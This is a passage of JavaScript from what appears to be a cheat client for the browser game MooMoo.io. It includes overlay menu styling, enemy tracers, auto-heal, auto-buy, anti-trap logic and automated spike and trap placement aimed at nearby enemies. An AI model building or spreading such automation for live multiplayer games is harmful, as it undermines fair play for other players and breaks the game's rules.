      Menu: `#z-menu { position: fixed; top: 50%; left: 50%; width: 920px; max-width: 95%; height: 680px; max-height: 90%; transform: translate(-50%, -50%) scale(0.975); background: linear-gradient(180deg, #181818, #242424); border-radius: 24px; color: #E0E0E0; font-family: 'Roboto', Arial, sans-serif; font-size: 16px; opacity: 0; pointer-events: none; border: 1px solid rgba(255,255,255,0.05); transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), opacity 0.3s ease; z-index: 9999; overflow: hidden; will-change: transform, opacity; } #z-menu.open { opacity: 1; pointer-events: auto; transform: translate(-50%, -50%) scale(1); } .z-menu-body { display: flex; height: calc(100% - 85px); } .z-content { flex: 1; padding: 20px; overflow-y: auto; font-size: 16px; line-height: 1.5; background: #0f0f0f; border-radius: 0 0 12px 0; } .z-page { display: none; } .z-page.active { display: block; } #z-menu .z-content { overflow-y: auto; padding-right: 8px; } #z-menu .z-content::-webkit-scrollbar { width: 6px; } #z-menu .z-content::-webkit-scrollbar-track { background: transparent; margin: 4px 0; } #z-menu .z-content::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.6); border-radius: 10px; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 0 4px rgba(155,92,255,0.4); transition: all 0.3s; } #z-menu .z-content::-webkit-scrollbar-thumb:hover { background: rgba(185,135,255,0.8); box-shadow: 0 0 8px rgba(185,135,255,0.6); } #z-menu .z-content { scrollbar-width: thin; scrollbar-color: rgba(155,92,255,0.6) transparent; } .z-menu-header { height: 85px; display: flex; align-items: center; justify-content: space-between; padding: 0 20px; border-bottom: 1px solid rgba(100,100,100,0.2); background: rgba(15,15,15,0.95); font-weight: 800; color: #9B5CFF; text-shadow: 0 0 6px rgba(155,92,255,0.8); box-shadow: 0 2px 6px rgba(0,0,0,0.5); } .z-title-container { display: flex; flex-direction: column; justify-content: center; } .z-title { font-size: 36px; font-weight: 900; letter-spacing: -0.5px; margin: 0; } .z-subtitle { font-size: 14px; font-weight: 500; color: rgba(255,255,255,0.6); margin-top: 2px; } .z-menu-nav { display: flex; align-items: center; gap: 10px; } .z-close-btn { width: 40px; height: 40px; border-radius: 20px; display: flex; align-items: center; justify-content: center; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12); color: rgba(255,255,255,0.8); cursor: pointer; transition: all 0.2s; } .z-close-btn:hover { background: rgba(255,255,255,0.12); color: #fff; transform: scale(1.05); } .z-menu-tabs { display: flex; gap: 4px; background: rgba(0,0,0,0.3); border-radius: 12px; padding: 4px; margin: 0 20px 20px; } .z-tab { padding: 10px 16px; border-radius: 8px; font-size: 14px; font-weight: 600; color: rgba(255,255,255,0.7); cursor: pointer; transition: all 0.2s; white-space: nowrap; } .z-tab:hover { background: rgba(255,255,255,0.08); color: #fff; } .z-tab.active { background: rgba(155,92,255,0.2); color: #EDE7FF; box-shadow: 0 0 0 1px rgba(155,92,255,0.3); } .z-sidebar { width: 280px; background: #141414; border-radius: 0 0 0 12px; padding: 20px; overflow-y: auto; } .z-sidebar::-webkit-scrollbar { width: 4px; } .z-sidebar::-webkit-scrollbar-track { background: transparent; } .z-sidebar::-webkit-scrollbar-thumb { background: rgba(155,92,255,0.4); border-radius: 10px; } .z-sidebar { scrollbar-width: thin; scrollbar-color: rgba(155,92,255,0.4) transparent; } .z-search { position: relative; margin-bottom: 20px; } .z-search input { width: 100%; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.12); border-radius: 8px; padding: 10px 38px 10px 12px; color: #fff; font-size: 14px; outline: none; transition: all 0.2s; } .z-search input:focus { border-color: rgba(155,92,255,0.5); box-shadow: 0 0 0 2px rgba(155,92,255,0.2); } .z-search input::placeholder { color: rgba(255,255,255,0.5); } .z-search .material-icons { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: rgba(255,255,255,0.5); font-size: 18px; pointer-events: none; } .z-section { margin-bottom: 24px; } .z-section-title { font-size: 12px; font-weight: 700; color: rgba(255,255,255,0.5); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 12px; } .z-option { display: flex; align-items: center; padding: 12px; border-radius: 8px; margin-bottom: 4px; transition: all 0.2s; cursor: pointer; } .z-option:hover { background: rgba(255,255,255,0.06); } .z-option .material-icons { font-size: 18px; color: rgba(255,255,255,0.7); margin-right: 12px; flex-shrink: 0; } .z-option-text { flex: 1; } .z-option-title { font-size: 14px; font-weight: 600; color: #fff; margin-bottom: 2px; } .z-option-desc { font-size: 12px; color: rgba(255,255,255,0.6); line-height: 1.4; } .z-checkbox { width: 20px; height: 20px; border-radius: 4px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); position: relative; transition: all 0.2s; cursor: pointer; } .z-checkbox.active { background: rgba(155,92,255,0.3); border-color: rgba(155,92,255,0.5); } .z-checkbox.active::after { content: ""; position: absolute; left: 6px; top: 2px; width: 6px; height: 10px; border: solid #EDE7FF; border-width: 0 2px 2px 0; transform: rotate(45deg); } .z-slider { width: 80px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; outline: none; -webkit-appearance: none; } .z-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 16px; height: 16px; border-radius: 50%; background: rgba(155,92,255,0.8); border: 2px solid #EDE7FF; cursor: pointer; } .z-slider-value { min-width: 30px; text-align: center; font-size: 12px; color: rgba(255,255,255,0.8); } .z-inputbox { width: 80px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 8px; color: #fff; font-size: 12px; outline: none; } .z-inputbox:focus { border-color: rgba(155,92,255,0.5); } .z-select-wrapper { position: relative; } .z-select-display { min-width: 80px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 24px 4px 8px; color: #fff; font-size: 12px; cursor: pointer; position: relative; } .z-select-display::after { content: "expand_more"; font-family: 'Material Icons'; position: absolute; right: 4px; top: 50%; transform: translateY(-50%); font-size: 16px; color: rgba(255,255,255,0.5); } .z-select-dropdown { position: absolute; top: 100%; left: 0; right: 0; background: rgba(30,30,30,0.98); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; padding: 4px; max-height: 120px; overflow-y: auto; z-index: 10; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.5); } .z-select-dropdown.show { display: block; } .z-select-option { padding: 6px 8px; font-size: 12px; color: rgba(255,255,255,0.8); cursor: pointer; border-radius: 2px; } .z-select-option:hover { background: rgba(155,92,255,0.2); color: #EDE7FF; } .z-color { position: relative; } .z-color-preview { width: 20px; height: 20px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.3); cursor: pointer; } .z-color-popup { position: absolute; top: 100%; right: 0; background: rgba(30,30,30,0.98); border: 1px solid rgba(255,255,255,0.15); border-radius: 6px; padding: 12px; z-index: 10; display: none; box-shadow: 0 8px 24px rgba(0,0,0,0.5); } .z-color-popup.show { display: block; } .z-sv-wrap { position: relative; width: 160px; height: 120px; border-radius: 4px; overflow: hidden; margin-bottom: 8px; } .z-sv { display: block; width: 100%; height: 100%; } .z-hue { width: 160px; height: 12px; background: linear-gradient(to right, #ff0000, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff, #ff0000); border-radius: 6px; outline: none; -webkit-appearance: none; margin-bottom: 8px; } .z-hue::-webkit-slider-thumb { -webkit-appearance: none; width: 16px; height: 16px; border-radius: 50%; background: #fff; border: 2px solid #000; cursor: pointer; } .z-color-inputs { display: flex; align-items: center; gap: 8px; } .z-color-inputs input { flex: 1; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 8px; color: #fff; font-size: 12px; outline: none; } .z-color-inputs input:focus { border-color: rgba(155,92,255,0.5); } .z-mode-toggle { background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); border-radius: 4px; padding: 4px 8px; font-size: 11px; color: rgba(255,255,255,0.8); cursor: pointer; } .z-mode-toggle:hover { background: rgba(255,255,255,0.12); } .z-loadout-display { display: flex; align-items: center; gap: 8px; } .z-loadout-mini { width: 24px; height: 24px; border-radius: 4px; border: 1px solid rgba(255,255,255,0.2); } .z-loadout-name { font-size: 12px; color: rgba(255,255,255,0.8); } .z-perf-card { background: rgba(255,255,255,0.05); border-radius: 8px; padding: 12px; margin-bottom: 8px; } .z-perf-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px; } .z-perf-left { display: flex; align-items: center; gap: 8px; } .z-perf-ico { width: 24px; height: 24px; border-radius: 6px; background: rgba(155,92,255,0.2); display: flex; align-items: center; justify-content: center; } .z-perf-ico .material-icons { font-size: 14px; color: #EDE7FF; } .z-perf-name { font-size: 12px; font-weight: 600; color: #fff; } .z-perf-meta { display: flex; gap: 12px; } .z-perf-meta span { font-size: 10px; color: rgba(255,255,255,0.6); } .z-perf-meta b { color: #fff; font-weight: 600; } .z-perf-canvas { display: block; width: 100%; height: 120px; } .z-perf-foot { display: flex; align-items: center; justify-content: space-between; margin-top: 4px; } .z-perf-foot span { font-size: 10px; color: rgba(255,255,255,0.6); } .z-perf-foot b { color: #fff; font-weight: 600; } .z-stat { background: rgba(255,255,255,0.05); border-radius: 8px; padding: 12px; margin-bottom: 8px; } .z-stat-top { display: flex; align-items: center; gap: 8px; margin-bottom: 8px; } .z-stat-ico { width: 20px; height: 20px; border-radius: 4px; background: rgba(155,92,255,0.2); display: flex; align-items: center; justify-content: center; } .z-stat-ico .material-icons { font-size: 12px; color: #EDE7FF; } .z-stat-name { font-size: 12px; font-weight: 600; color: #fff; } .z-stat-row { display: flex; align-items: center; justify-content: space-between; } .z-stat-big { font-size: 20px; font-weight: 700; color: #fff; } .z-stat-total { font-size: 10px; color: rgba(255,255,255,0.6); } .z-stat-total b { color: #fff; font-weight: 600; } .z-stat-foot { margin-top: 8px; } .z-stat-bar { height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; overflow: hidden; } .z-stat-bar div { height: 100%; background: linear-gradient(90deg, #9B5CFF, #B987FF); border-radius: 2px; } .z-btn-option:hover { background: rgba(155,92,255,0.15); } .z-submenu-btn { width: 24px; height: 24px; border-radius: 4px; background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.15); display: flex; align-items: center; justify-content: center; color: rgba(255,255,255,0.7); cursor: pointer; transition: all 0.2s; } .z-submenu-btn:hover { background: rgba(255,255,255,0.12); color: #fff; } .z-submenu-container { margin-left: 44px; margin-top: 8px; border-left: 2px solid rgba(255,255,255,0.1); padding-left: 12px; } .z-sec-title { font-size: 16px; font-weight: 700; color: #fff; margin-bottom: 16px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.1); } `,
    },
  },

  Draw: {
    offsetX() {
      return camX - maxScreenWidth / 2;
    },

    offsetY() {
      return camY - maxScreenHeight / 2;
    },

    Arrow(context, type, Size, color) {
      const X = (type.x + player.x) / 2;
      const Y = (type.y + player.y) / 2;
      const direction = Math.atan2(type.y - player.y, type.x - player.x);
      context.save();
      context.translate(X - this.offsetX(), Y - this.offsetY());
      context.rotate(direction);
      context.beginPath();
      context.moveTo(-Size / 2, Size);
      context.lineTo(Size / 2, 0);
      context.lineTo(-Size / 2, -Size);
      context.strokeStyle = color;
      context.stroke();
      context.restore();
    },

    Line(context, type, type2, width, color) {
      context.save();
      context.lineCap = "round";
      context.strokeStyle = color;
      context.lineWidth = width;
      context.beginPath();
      context.moveTo(type.x - this.offsetX(), type.y - this.offsetY());
      context.lineTo(type2.x - this.offsetX(), type2.y - this.offsetY());
      context.stroke();
      context.closePath();
      context.restore();
    },

    DashLine(context, type, type2, dashLength, width, color) {
      context.save();
      context.lineCap = "round";
      context.strokeStyle = color;
      context.lineWidth = width;
      context.setLineDash([dashLength]);
      context.beginPath();
      context.moveTo(type.x - this.offsetX(), type.y - this.offsetY());
      context.lineTo(type2.x - this.offsetX(), type2.y - this.offsetY());
      context.stroke();
      context.closePath();
      context.restore();
    },

    Bar(context, x, y, scale, value, color, isReloadBar = false, xFill = null) {
      const width = isReloadBar ? 2.2 * 22 : config.healthBarWidth;
      const height = 17;
      const pad = config.healthBarPad;
      context.save();
      context.fillStyle = isReloadBar ? darkOutlineColor : darkOutlineColor;
      context.beginPath();
      if (isReloadBar) {
        context.roundRect(x, y, width + pad * 2, height, 8);
      } else {
        context.roundRect(
          x - this.offsetX() - width - pad,
          y - this.offsetY() + scale + config.nameY,
          width * 2 + pad * 2,
          height,
          8,
        );
      }

      context.fill();
      context.fillStyle = color;
      context.beginPath();
      if (isReloadBar) {
        context.roundRect(
          xFill !== null ? xFill : x + pad,
          y + pad,
          width * value,
          height - 2 * pad,
          7,
        );
      } else {
        context.roundRect(
          x - this.offsetX() - width,
          y - this.offsetY() + scale + config.nameY + pad,
          width * 2 * value,
          height - pad * 2,
          7,
        );
      }
      context.fill();
      context.restore();
    },

    Circle(
      context,
      centerX,
      centerY,
      radius,
      startAngle,
      endAngle,
      lineWidth,
      lineColor,
      fill = false,
    ) {
      context.save();
      context.strokeStyle = lineColor;
      context.lineWidth = lineWidth;
      context.lineCap = "round";
      context.beginPath();
      context.arc(
        centerX - this.offsetX(),
        centerY - this.offsetY(),
        radius,
        startAngle,
        endAngle,
      );

      if (fill) {
        context.fillStyle = lineColor;
        context.fill();
      } else {
        context.stroke();
      }

      context.restore();
    },

    DrawImage(context, data, x, y, dir = 0, alpha = 1) {
      const img = getItemSprite(data, true);
      context.save();
      context.globalAlpha = alpha;
      context.translate(x - this.offsetX(), y - this.offsetY());
      context.rotate(dir);
      context.drawImage(img, -img.width / 2, -img.height / 2);
      context.restore();
    },

    Tracer(context, target, size, color) {
      context.save();
      context.beginPath();
      context.rect(
        target.x - this.offsetX() - size / 2,
        target.y - this.offsetY() - size / 2,
        size,
        size,
      );
      context.strokeStyle = color;
      context.stroke();
      context.restore();
    },

    Text(context, text, x, y, fontSize = "20", color) {
      context.save();
      context.font = `${fontSize}px Hammersmith One`;
      context.fillStyle = color;
      context.textBaseline = "middle";
      context.textAlign = "center";
      context.lineWidth = 8;
      context.lineJoin = "round";
      context.strokeText(text, x - this.offsetX(), y - this.offsetY());
      context.fillText(text, x - this.offsetX(), y - this.offsetY());
      context.restore();
    },
  },

  GameState: {
    isInGame() {
      return inGame;
    },

    getMyPlayer() {
      return player;
    },

    getPlayers() {
      return players;
    },

    getGameObjects() {
      return gameObjects;
    },

    getProjectiles() {
      return projectiles;
    },

    getAlliances() {
      return alliances;
    },

    getEnemies() {
      return Mod.enemy;
    },

    getNearPlayers() {
      return Mod.nears;
    },

    getMapScale() {
      return config.mapScale;
    },
  },

  PlayerActions: {
    heal(type) {
      if (type === "shame") {
        if (typeof noshameheal === "function") noshameheal();
      } else if (type === "anti") {
        if (typeof antiSyncHealing === "function") antiSyncHealing();
      } else if (type === "1") {
        if (typeof healer1 === "function") healer1();
      } else if (type === "33") {
        if (typeof healer33 === "function") healer33();
      } else {
        if (typeof healer === "function") healer();
      }
    },

    healthBased() {
      if (typeof healthBased === "function") return healthBased();
      return 0;
    },

    soldierMult() {
      if (typeof soldierMult === "function") return soldierMult();
      return 1;
    },

    getAttacker() {
      if (typeof getAttacker === "function") return getAttacker();
      return null;
    },
  },

  AutoMill: {
    enabled: false,

    place() {
      if (!this.enabled) return;
      Mod.Place.AutoMill();
    },

    toggle() {
      this.enabled = !this.enabled;
      mills.place = this.enabled ? 1 : 0;
    },

    setEnabled(state) {
      this.enabled = state;
      mills.place = state ? 1 : 0;
    },
  },

  AutoBuy: {
    enabled: false,
    instance: null,

    init(hatList, accList) {
      if (typeof Autobuy !== "undefined") {
        this.instance = new Autobuy(hatList || [], accList || []);
      }
    },

    buyHats() {
      if (this.instance && this.instance.hat) this.instance.hat();
    },

    buyAccessories() {
      if (this.instance && this.instance.acc) this.instance.acc();
    },

    buyAll() {
      this.buyHats();
      this.buyAccessories();
    },
  },

  Traps: {
    instance: null,

    init(utils, itemsList) {
      if (typeof Traps !== "undefined") {
        this.instance = new Traps(utils, itemsList);
      }
    },

    inTrap() {
      return this.instance ? this.instance.inTrap : false;
    },

    antiTrap() {
      if (this.instance && typeof this.instance.antiTrap === "function") {
        return this.instance.antiTrap();
      }
    },

    getTrapInfo() {
      return this.instance ? this.instance.info : {};
    },

    checkSpikeTick() {
      if (this.instance && typeof this.instance.checkSpikeTick === "function") {
        return this.instance.checkSpikeTick();
      }
      return false;
    },
  },

  initPlayer() {
    this.player = null;
    this.playerSID = null;
    this.enemy = [];
    this.nears = [];
    this.near = [];
  },

  getPlayer() {
    return this.player;
  },

  setPlayer(p) {
    this.player = p;
    if (p) this.playerSID = p.sid;
  },

  hasPlayer() {
    return this.player !== null;
  },

  findID(id) {
    return findID(id);
  },

  findSID(sid) {
    return findSID(sid);
  },

  sendPacket(type, data) {
    packet(type);
  },

  sendChat(message) {
    sendChat(message);
  },

  Combat: {
    Hit: null,

    init() {
      this.Hit = Hit;
    },

    sendAtck(state, dir) {
      sendAtck(state, dir);
    },

    sendAutoGather() {
      sendAutoGather();
    },

    getAttackDir() {
      return getAttackDir();
    },

    checkHitState() {
      return attackState;
    },
  },

  Place: {
    _lastObstaclePlace: 0,
    _lastMill: null,

    place(id, dir, isTrue) {
      place(id, dir, isTrue);
    },

    selectToBuild(id, isTrue) {
      selectToBuild(id, isTrue);
    },

    checkPlace(id, isTrue) {
      checkPlace(id, isTrue);
    },

    AutoMill() {
      if (!mills.place) return;
      if (window.location.host !== "sandbox.moomoo.io" || checkLimit(3)) {
        mills.place = false;
        return;
      }
      if (
        !player ||
        lastMoveDir === undefined ||
        (player.y > 6838 && player.y < 7563)
      )
        return;

      if (!this._lastMill) this._lastMill = { x: player.x, y: player.y };
      const W2 =
        1.13 +
        (player.items[3] === 11 ? 0.02 : player.items[3] === 12 ? 0.06 : 0);
      const angles = [
        lastMoveDir + Math.PI,
        lastMoveDir + Math.PI - W2,
        lastMoveDir + Math.PI + W2,
      ];

      if (fsd(this._lastMill, player) >= 90) {
        angles.forEach((a) => checkPlace(3, a));
        this._lastMill.x = player.x;
        this._lastMill.y = player.y;
      }
    },

    canPlaceAt(x, y, itemScale, ignoreSid) {
      if (
        !objectManager.checkItemLocation(
          x,
          y,
          itemScale,
          0.6,
          0,
          false,
          player,
          ignoreSid,
        )
      ) {
        return false;
      }
      for (let i = 0; i < liztobj.length; i++) {
        const obj = liztobj[i];
        if (!obj.active || obj.sid === ignoreSid) continue;
        const objScale = this.getObjScale(obj);
        const dx = x - obj.x;
        const dy = y - obj.y;
        const minDist = itemScale + objScale;
        if (dx * dx + dy * dy < minDist * minDist) {
          return false;
        }
      }
      return true;
    },

    getObjScale(obj) {
      if (!obj) return 0;
      const colDiv = obj.colDiv == null ? 1 : obj.colDiv;
      return (
        obj.blocker ||
        obj.scale *
        (obj.isItem || [2, 3, 4].includes(obj.type) ? 1 : 0.6) *
        colDiv
      );
    },

    inRiver(y) {
      const river = {
        min: config.mapScale / 2 - config.riverWidth / 2,
        max: config.mapScale / 2 + config.riverWidth / 2,
      };
      return y >= river.min && y <= river.max;
    },

    closestPossibleAngles(obj, id) {
      let itemId = player.items[id];
      if (itemId == undefined) return;
      let item = items.list[itemId];
      let objScale = obj.getScale
        ? obj.getScale(0.6, obj.isItem) + 0.6
        : obj.scale + 0.6;
      let dx = obj.x - player.x2;
      let dy = obj.y - player.y2;
      let dist = Math.sqrt(dx * dx + dy * dy);
      if (dist > player.scale + objScale + 2 * item.scale + item.placeOffset) {
        return [UTILS.getDirect(obj, player, 0, 2)];
      }
      let D = player.scale + item.scale + item.placeOffset;
      let E = objScale + item.scale;
      let a = (D * D - E * E + dist * dist) / (2 * dist);
      let h = Math.sqrt(Math.max(0, D * D - a * a));
      let px = player.x2 + (a / dist) * dx;
      let py = player.y2 + (a / dist) * dy;
      let c = {
        x1: px + (h / dist) * dy,
        x2: px - (h / dist) * dy,
        y1: py - (h / dist) * dx,
        y2: py + (h / dist) * dx,
      };
      return [
        Math.atan2(c.y1 - player.y2, c.x1 - player.x2),
        Math.atan2(c.y2 - player.y2, c.x2 - player.x2),
      ];
    },

    getAngles(id, amount, aimAngle = null, arc = null) {
      const item = items.list[player.items[id]];
      if (!item) return [];
      const PI2 = Math.PI * 2;

      const px = player.x2;
      const py = player.y2;
      const placeRadius = (player.scale || 35) + item.scale + (item.placeOffset || 0);
      const minAngleDiff = Math.min(0.55, Math.max(0.03, (2 * item.scale) / Math.max(1, placeRadius)));
      const wantFill = (amount | 0) <= 0;
      const useAim = typeof aimAngle === "number";
      let width = useAim ? (typeof arc === "number" ? arc : item.dmg ? 1.8 : PI2) : PI2;
      if (!(width > 0)) width = PI2;
      if (width > PI2) width = PI2;
      if (width < 0.12) width = 0.12;

      const desired = wantFill ? 60 : Math.max(1, Math.min(60, amount | 0));

      let ranges = null;
      if (typeof traps?.ensureAngleRanges === "function") {
        ranges = traps.ensureAngleRanges(id);
      }
      const norm = (a) => {
        a %= PI2;
        return a < 0 ? a + PI2 : a;
      };
      const inRanges = (a) => {
        if (!ranges || !ranges.length) return true;
        for (let i = 0; i < ranges.length; i++) {
          const r = ranges[i];
          const s = r[0], e = r[1];
          if (s <= e) {
            if (a >= s && a <= e) return true;
          } else {
            if (a >= s || a <= e) return true;
          }
        }
        return false;
      };
      const withinArc = (a) => {
        if (!useAim) return true;
        if (width >= PI2) return true;
        const halfArc = width * 0.5;
        return Math.abs(UTILS.getAngleDist(aimAngle, a)) <= halfArc + 0.002;
      };
      const micro = item.dmg ? 0.0038 : 0.0075;
      const step = 0.01

      const res = [];
      const tryPush = (a) => {
        a = norm(a);
        if (!withinArc(a)) return false;
        if (!inRanges(a) && typeof traps?.closeToAngle === "function" && ranges && ranges.length) {
          const snapped = traps.closeToAngle(a, ranges);
          if (snapped == null) return false;
          a = norm(snapped);
          if (!withinArc(a)) return false;
        }
        for (let i = 0; i < res.length; i++) {
          if (Math.abs(UTILS.getAngleDist(res[i], a)) < minAngleDiff) return false;
        }
        const x = px + Math.cos(a) * placeRadius;
        const y = py + Math.sin(a) * placeRadius;
        if (typeof this.gpIntersects === "function" && this.gpIntersects(x, y, item.scale)) return false;
        if (!objectManager.checkItemLocation(x, y, item.scale, 0.6, item.id, false, player)) return false;
        res.push(a);
        return true;
      };
      const pushWithMicro = (a) => {
        if (tryPush(a)) return true;
        for (let k = 1; k <= 3; k++) {
          if (tryPush(a + micro * k)) return true;
          if (tryPush(a - micro * k)) return true;
        }
        return false;
      };

      if (useAim) {
        pushWithMicro(aimAngle);
        const halfArc = width * 0.5;
        const maxI = Math.min(320, Math.max(10, Math.ceil((halfArc + 0.001) / step)));
        for (let i = 1; i <= maxI && res.length < desired; i++) {
          const off = i * step;
          pushWithMicro(aimAngle + off);
          if (res.length >= desired) break;
          pushWithMicro(aimAngle - off);
        }
        if (res.length < Math.min(4, desired) && width < PI2) {
          width = PI2;
          const maxI2 = Math.min(420, Math.max(24, Math.ceil((Math.PI + 0.001) / step)));
          for (let i = 1; i <= maxI2 && res.length < desired; i++) {
            const off = i * step;
            pushWithMicro(aimAngle + off);
            if (res.length >= desired) break;
            pushWithMicro(aimAngle - off);
          }
        }
      } else {
        const maxI = Math.min(700, Math.max(24, Math.ceil(PI2 / step)));
        for (let i = 0; i < maxI && res.length < desired; i++) {
          pushWithMicro(i * step);
        }
      }

      if (res.length < desired) {
        const fillStep = Math.max(0.02, minAngleDiff * 0.66);
        const fillRange = (start, end) => {
          if (!(fillStep > 0)) return;
          if (start <= end) {
            for (let a = start; a <= end && res.length < desired; a += fillStep) {
              pushWithMicro(a);
            }
          } else {
            for (let a = start; a <= PI2 && res.length < desired; a += fillStep) {
              pushWithMicro(a);
            }
            for (let a = 0; a <= end && res.length < desired; a += fillStep) {
              pushWithMicro(a);
            }
          }
        };

        if (ranges && ranges.length) {
          for (let i = 0; i < ranges.length && res.length < desired; i++) {
            fillRange(norm(ranges[i][0]), norm(ranges[i][1]));
          }
        } else {
          fillRange(0, PI2);
        }
      }

      return res;
    },

    placeAround(id, amount = 0) {
      if (!id || !player.items[id]) return;
      const angles = this.getAngles(id, amount);
      if (!angles) return;
      for (let i = 0; i < angles.length; i++) {
        place(id, angles[i], 1);
      }
    },

    testCanPlace(id, first, repeat, plus, radian, replacer, yaboi) {
      const PI = Math.PI;
      const PI2 = PI * 2;
      const cos = Math.cos;
      const sin = Math.sin;
      try {
        if (typeof first === "number" && typeof repeat === "boolean" && radian === undefined) {
          yaboi = plus;
          replacer = repeat;
          radian = first;
          first = -PI / 2;
          repeat = PI / 2;
          plus = PI / 18;
        }
        if (first === undefined) first = -PI / 2;
        if (repeat === undefined) repeat = PI / 2;
        if (plus === undefined) plus = PI / 18;
        let item = items.list[player.items[id]];
        if (!item) return;
        let tmpS = player.scale + item.scale + (item.placeOffset || 0);
        if (!this.placeCooldowns) this.placeCooldowns = new Map();
        if (!this.placeCooldownsPending) this.placeCooldownsPending = new Map();
        const now = Date.now();
        if (this.placeCooldowns.size > 2000) {
          for (const [k, v] of this.placeCooldowns) {
            if (v <= now) this.placeCooldowns.delete(k);
            if (this.placeCooldowns.size <= 1500) break;
          }
        }
        if (this.placeCooldownsPending.size > 2000) {
          for (const [k, v] of this.placeCooldownsPending) {
            if (v <= now) this.placeCooldownsPending.delete(k);
            if (this.placeCooldownsPending.size <= 1500) break;
          }
        }
        const getKey = (x, y) => `${item.id}|${x.toFixed(3)}|${y.toFixed(3)}`;
        let counts = { attempts: 0, placed: 0, placedAny: 0 };
        let tmpObjects = [];

        liztobj.forEach((p) => {
          tmpObjects.push({
            x: p.x,
            y: p.y,
            active: p.active,
            blocker: p.blocker,
            scale: p.scale,
            isItem: p.isItem,
            type: p.type,
            colDiv: p.colDiv,
            getScale: function (sM = 1, ig) {
              return (
                this.scale *
                (this.isItem || [2, 3, 4].includes(this.type) ? 1 : 0.6 * sM) *
                (ig ? 1 : this.colDiv)
              );
            },
          });
        });

        for (let i = first; i < repeat; i += plus) {
          counts.attempts++;
          let relAim = radian + i;
          let tmpX = player.x2 + tmpS * cos(relAim);
          let tmpY = player.y2 + tmpS * sin(relAim);
          let key = getKey(tmpX, tmpY);
          let cooldownUntil = this.placeCooldowns.get(key) || 0;
          if (cooldownUntil > now) continue;
          if (cooldownUntil) this.placeCooldowns.delete(key);
          let cantPlace = tmpObjects.find(
            (tmp) =>
              tmp.active &&
              UTILS.getDistance(tmpX, tmpY, tmp.x, tmp.y) <
              item.scale +
              (tmp.blocker ? tmp.blocker : tmp.getScale(0.6, tmp.isItem)),
          );
          if (cantPlace) continue;
          if (
            item.id !== 18 &&
            tmpY >= config.mapScale / 2 - config.riverWidth / 2 &&
            tmpY <= config.mapScale / 2 + config.riverWidth / 2
          )
            continue;

          if (!replacer && yaboi) {
            if (yaboi.inTrap) {
              if (UTILS.getAngleDist(near.aim2 + PI, relAim + PI) <= PI * 1.3) {
                this.placeCooldowns.set(key, Date.now() + 350);
                place(2, relAim, 1);
                counts.placedAny++;
              } else {
                this.placeCooldowns.set(key, Date.now() + 350);
                if (player.items[4] === 15) {
                  place(4, relAim, 1);
                  counts.placedAny++;
                }
              }
            } else {
              if (
                UTILS.getAngleDist(near.aim2, relAim) <=
                config.gatherAngle / 2.6
              ) {
                this.placeCooldowns.set(key, Date.now() + 350);
                place(2, relAim, 1);
                counts.placedAny++;
              } else {
                this.placeCooldowns.set(key, Date.now() + 350);
                if (player.items[4] === 15) {
                  place(4, relAim, 1);
                  counts.placedAny++;
                }
              }
            }
          } else {
            this.placeCooldowns.set(key, Date.now() + 350);
            place(id, relAim, 1);
            counts.placedAny++;
          }

          const checkX = tmpX;
          const checkY = tmpY;
          const checkKey = key;
          const checkRadius = (item.scale || 0) + 8;
          const pendingUntil = this.placeCooldownsPending.get(checkKey) || 0;
          if (pendingUntil <= now) {
            const ping = window.pingTime ?? window.ping ?? 0;
            const checkDelay = Math.min(800, Math.max(180, 160 + ping * 1.2));
            this.placeCooldownsPending.set(checkKey, now + checkDelay + 50);
            setTimeout(() => {
              try {
                if (!this.placeCooldownsPending) return;
                this.placeCooldownsPending.delete(checkKey);
                const ownerSid = player?.sid;
                let found = liztobj.some(
                  (o) =>
                    o &&
                    o.active &&
                    o.isItem &&
                    o.id === item.id &&
                    (!ownerSid || (o.owner && o.owner.sid === ownerSid)) &&
                    UTILS.getDistance(checkX, checkY, o.x, o.y) < checkRadius,
                );
                if (!this.placeCooldowns) return;
                if (found) {
                  if (this.placeCooldowns.get(checkKey)) this.placeCooldowns.delete(checkKey);
                } else {
                  this.placeCooldowns.set(checkKey, Date.now() + 3000);
                }
              } catch (err) { }
            }, checkDelay);
          }

          tmpObjects.push({
            x: tmpX,
            y: tmpY,
            active: true,
            blocker: item.blocker,
            scale: item.scale,
            isItem: true,
            type: null,
            colDiv: item.colDiv,
            getScale: function () {
              return this.scale;
            },
          });

          if (UTILS.getAngleDist(near.aim2, relAim) <= 1) counts.placed++;
        }

      } catch (err) { }
    },

    gpPrune() {
      if (!this.gpRecent) this.gpRecent = [];
      const nowTick = game.tick || 0;
      const nowMs = Date.now();
      const keepTicks = 8;
      const keepMs = 900;
      this.gpRecent = this.gpRecent.filter((p) => {
        if (!p) return false;
        if (nowTick && p.t != null) return nowTick - p.t <= keepTicks;
        return nowMs - (p.ms || 0) <= keepMs;
      });
    },

    gpIntersects(x, y, s) {
      if (!this.gpRecent || !this.gpRecent.length) return false;
      const sx = x;
      const sy = y;
      const ss = s;
      for (let i = 0; i < this.gpRecent.length; i++) {
        const p = this.gpRecent[i];
        const dx = sx - p.x;
        const dy = sy - p.y;
        const minD = ss + p.s;
        if (dx * dx + dy * dy < minD * minD) return true;
      }
      return false;
    },

    gpMark(x, y, s, itemId) {
      if (!this.gpRecent) this.gpRecent = [];
